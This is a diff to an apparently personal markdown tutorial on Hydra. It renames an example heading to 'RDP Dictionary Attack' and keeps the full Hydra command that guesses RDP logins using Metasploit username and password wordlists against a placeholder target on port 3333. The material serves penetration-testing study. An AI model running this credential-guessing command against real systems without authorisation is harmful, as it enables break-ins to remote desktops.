@@ -41,8 +41,8 @@ Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] htt
 
 <br>
 
-## Example of RDP brute force with Hydra <br>
-**Command:**
+## Example of RDP Dictionary Attack with Hydra <br>
+**Command:** <br>
 **hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://ip -s 3333 <br>**
 (in my case the RDP port is 3333 and i used metasploit user and password list) <br>
 **Output** <br>
